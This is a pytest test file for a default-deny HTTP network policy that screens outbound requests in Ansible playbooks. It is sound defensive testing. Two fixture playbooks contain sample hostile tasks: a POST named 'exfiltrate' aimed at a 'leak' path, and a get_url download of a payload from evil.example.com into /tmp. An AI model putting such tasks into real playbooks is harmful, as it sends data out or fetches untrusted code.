"""TDD tests for L7 HTTP network policy enforcement (OpenShell P0 transfer).

Every outbound HTTP request an Ansible playbook makes via ``ansible.builtin.uri``
or ``ansible.builtin.get_url`` is validated against a declarative
:class:`NetworkPolicy` BEFORE the playbook executes. The policy checks the HTTP
method + path prefix + host of each request. Default is deny: a policy with no
rules blocks every request. Denials emit a structured audit event.
"""

from __future__ import annotations

import logging

import pytest

from general_ludd.ansible.network_policy import (
    NetworkPolicy,
    PolicyRule,
    scan_playbook_tasks,
)


def _get_only_github() -> NetworkPolicy:
    """A policy allowing only GET/HEAD to api.github.com under /api/."""
    return NetworkPolicy(
        rules=[
            PolicyRule(
                host="api.github.com",
                methods=["GET", "HEAD"],
                path_prefix="/api/",
            )
        ]
    )


def test_allow_get_on_allowed_host() -> None:
    policy = NetworkPolicy(
        rules=[PolicyRule(host="api.github.com", methods=["GET"], path_prefix="/")]
    )
    allowed, reason = policy.check_uri_module(
        {"url": "https://api.github.com/api/v3/repos", "method": "GET"}
    )
    assert allowed is True, reason


def test_block_post_on_allowed_host() -> None:
    policy = NetworkPolicy(
        rules=[PolicyRule(host="api.github.com", methods=["GET"], path_prefix="/")]
    )
    allowed, reason = policy.check_uri_module(
        {"url": "https://api.github.com/api/v3/repos", "method": "POST"}
    )
    assert allowed is False
    assert "POST" in reason


def test_block_on_denied_host() -> None:
    policy = _get_only_github()
    allowed, reason = policy.check_uri_module(
        {"url": "https://evil.example.com/api/v1/users", "method": "GET"}
    )
    assert allowed is False
    assert "evil.example.com" in reason


def test_path_prefix_match() -> None:
    policy = NetworkPolicy(
        rules=[PolicyRule(host="api.github.com", methods=["GET"], path_prefix="/api/")]
    )
    allowed, reason = policy.check_uri_module(
        {"url": "https://api.github.com/api/v1/users", "method": "GET"}
    )
    assert allowed is True, reason


def test_path_prefix_no_match() -> None:
    policy = NetworkPolicy(
        rules=[PolicyRule(host="api.github.com", methods=["GET"], path_prefix="/api/")]
    )
    allowed, reason = policy.check_uri_module(
        {"url": "https://api.github.com/other/path", "method": "GET"}
    )
    assert allowed is False
    assert "/other/path" in reason or "path" in reason.lower()


def test_method_list() -> None:
    policy = NetworkPolicy(
        rules=[
            PolicyRule(host="api.github.com", methods=["GET", "HEAD"], path_prefix="/")
        ]
    )
    ok_allowed, _ = policy.check_uri_module(
        {"url": "https://api.github.com/x", "method": "HEAD"}
    )
    assert ok_allowed is True

    blocked_allowed, reason = policy.check_uri_module(
        {"url": "https://api.github.com/x", "method": "DELETE"}
    )
    assert blocked_allowed is False
    assert "DELETE" in reason


def test_default_is_deny() -> None:
    policy = NetworkPolicy(rules=[])
    allowed, reason = policy.check_uri_module(
        {"url": "https://api.github.com/anything", "method": "GET"}
    )
    assert allowed is False
    assert "deny" in reason.lower() or "no rule" in reason.lower()


def test_hostname_wildcard() -> None:
    policy = NetworkPolicy(
        rules=[PolicyRule(host="*.github.com", methods=["GET"], path_prefix="/")]
    )
    allowed, reason = policy.check_uri_module(
        {"url": "https://api.github.com/repos", "method": "GET"}
    )
    assert allowed is True, reason


def test_audit_log_on_deny(caplog: pytest.LogCaptureFixture) -> None:
    from unittest.mock import patch

    policy = _get_only_github()
    policy_logger = logging.getLogger("general_ludd.ansible.network_policy")
    with patch.object(policy_logger, "warning", wraps=policy_logger.warning) as mock_warning:
        allowed, _ = policy.check_uri_module(
            {"url": "https://api.github.com/api/v1/x", "method": "POST"}
        )
    assert allowed is False
    assert mock_warning.call_count >= 1
    call_args = [call.args[0] for call in mock_warning.mock_calls if call.args]
    assert any("network_policy_deny" in str(a) for a in call_args), \
        f"No 'network_policy_deny' in warning args: {call_args}"
    extra_kwargs = [
        call.kwargs.get("extra", {}) for call in mock_warning.mock_calls
        if call.kwargs.get("extra")
    ]
    assert any(e.get("host") == "api.github.com" for e in extra_kwargs)
    assert any(e.get("method") == "POST" for e in extra_kwargs)
    assert any(e.get("url_path") == "/api/v1/x" for e in extra_kwargs)


def test_default_method_is_get() -> None:
    """The uri module defaults to GET when no method is supplied."""
    policy = NetworkPolicy(
        rules=[PolicyRule(host="api.github.com", methods=["GET"], path_prefix="/")]
    )
    allowed, reason = policy.check_uri_module({"url": "https://api.github.com/x"})
    assert allowed is True, reason


def test_scan_playbook_tasks_blocks_post(tmp_path: object) -> None:
    """scan_playbook_tasks returns a violation for a POST uri task under a GET-only policy."""
    import pathlib

    assert isinstance(tmp_path, pathlib.Path)
    playbook = tmp_path / "pb.yml"
    playbook.write_text(
        """
- hosts: localhost
  tasks:
    - name: exfiltrate
      ansible.builtin.uri:
        url: https://api.github.com/api/v1/leak
        method: POST
    - name: allowed read
      ansible.builtin.uri:
        url: https://api.github.com/api/v1/read
        method: GET
"""
    )
    policy = _get_only_github()
    violations = scan_playbook_tasks(str(playbook), policy)
    assert len(violations) == 1
    assert "POST" in violations[0]


def test_scan_playbook_tasks_get_url(tmp_path: object) -> None:
    """get_url is treated as a GET request and validated against the policy."""
    import pathlib

    assert isinstance(tmp_path, pathlib.Path)
    playbook = tmp_path / "pb.yml"
    playbook.write_text(
        """
- hosts: localhost
  tasks:
    - name: fetch from denied host
      ansible.builtin.get_url:
        url: https://evil.example.com/payload
        dest: /tmp/x
"""
    )
    policy = _get_only_github()
    violations = scan_playbook_tasks(str(playbook), policy)
    assert len(violations) == 1
    assert "evil.example.com" in violations[0]
